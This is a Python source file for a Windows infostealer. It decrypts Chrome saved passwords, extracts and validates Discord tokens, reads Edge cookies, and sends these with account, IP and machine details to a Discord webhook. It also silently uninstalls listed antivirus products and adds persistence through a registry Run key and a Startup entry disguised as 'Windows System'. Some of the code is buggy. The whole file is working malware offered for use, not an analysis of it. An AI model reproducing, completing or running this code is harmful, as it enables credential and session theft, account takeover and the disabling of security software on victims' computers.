import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import requests
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
import subprocess
import winreg as reg
from datetime import datetime

USER = os.environ["USERPROFILE"]
LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (USER))
USER_DATA = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (USER))
WEBHOOK_URL = "Discord Webhook Url!"

def secret_key():
    try:
        with open(LOCAL_STATE, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        return win32crypt.CryptUnprotectData(base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
    except Exception as e:
        print(f"\033[0;31m{e}\033[0m")
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        return decrypt_payload(cipher, encrypted_password).decode()
    except Exception as e:
        return ""

def get_db_connection(path: str):
    try:
        shutil.copy2(path, "table.db")
        return sqlite3.connect("table.db")
    except Exception as e:
        print(f"\033[0;31m{e}\033[0m")
        print("ERROR: chrome database not found")
        return None

def is_chrome_profile(folder_name: str):
    return folder_name.startswith("Profile") or folder_name == "Default"

def send_to_discord(record):
    embed = {
        "embeds": [
            {
                "title": "Chrome",
                "fields": [
                    {"name": "Index", "value": str(record['index'])},
                    {"name": "URL", "value": record['url']},
                    {"name": "Username", "value": record['username']},
                    {"name": "Password", "value": record['password']},
                ]
            }
        ]
    }
    response = requests.post(WEBHOOK_URL, json=embed)
    
if __name__ == "__main__":
    try:
        secret_key = secret_key()
        folders = [element for element in os.listdir(USER_DATA) if is_chrome_profile(element)]
        for folder in folders:
            path = os.path.normpath(r"%s\%s\Login Data" % (USER_DATA, folder))
            connection = get_db_connection(path)
            if secret_key and connection:
                cursor = connection.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index, login in enumerate(cursor.fetchall()):
                    record = {
                        "index": index,
                        "url": login[0],
                        "username": login[1],
                    }
                    ciphertext = login[2]
                    if record['username'] and ciphertext:
                        record['password'] = decrypt_password(ciphertext, secret_key)
                        send_to_discord(record)
                cursor.close()
                connection.close()
                os.remove("table.db")
    except Exception as e:
        print("[+] INFO 191")

tokens = []
cleaned = []
checker = []
def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"
def ip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip
def hwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def discord_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\discord',
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError: continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = ip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        embed = f"""**{user_name}** *({user_id})*\n
__Account Information__\n\tEmail: `{email}`\n\tPhone Nomber: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
__PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
__Token__\n\t`{tok}`\n
"""
                        payload = json.dumps({'content': embed})
                        try:
                            headers2 = {
                                'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                            }
                            req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: continue
                else: continue
if __name__ == '__main__':
    discord_token()

def start_app_reg():
    script_path = os.path.realpath(__file__)
    key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
    reg.SetValueEx(key, "Windows System", 0, reg.REG_SZ, script_path)
    reg.CloseKey(key)

def start_app_folder():
    script_path = os.path.realpath(__file__)
    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    shortcut_name = "Windows System"
    shortcut_path = os.path.join(startup_folder, shortcut_name)
    with open(shortcut_path, "w") as f:
            f.write(f"[Desktop Entry]\n")
            f.write(f"Name=MyPythonScript\n")
            f.write(f"Exec={script_path}\n")
            f.write(f"Type=Application\n")
os.system("cls")

def edge_cookie():
    cookies_path = os.path.join(os.environ['LOCALAPPDATA'], r'Microsoft\Edge\User Data\Default\Cookies')
    conn = sqlite3.connect(cookies_path)
    cursor = conn.cursor()
    cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
    cookies = []
    for host_key, name, value, encrypted_value in cursor.fetchall():
        if encrypted_value:
            decrypted_value = win32crypt.CryptUnprotectData(encrypted_value)[1].decode()
        else:
            decrypted_value = value
        cookies.append({'domain': host_key, 'name': name, 'value': decrypted_value})
    conn.close()
    return cookies

def discord_webhook(cookies):
    webhook_url = WEBHOOK_URL
    data = {
        'content': json.dumps(cookies, indent=4)
    }
    requests.post(webhook_url, json=data)
    cookies = edge_cookie()
    discord_webhook(cookies)

def remove_antivirus(antivirus_names):
    for antivirus in antivirus_names:
            subprocess.run(f"wmic product where name='{antivirus}' call uninstall", shell=True, check=True)

os.system("cls")
antivirus_list = ["V3 365", "V3", "ALYac", "알약", "V3 Internet Security", "Kaspersky", ]
remove_antivirus(antivirus_list)

if __name__ == "__main__":
    start_app_reg()
    start_app_folder()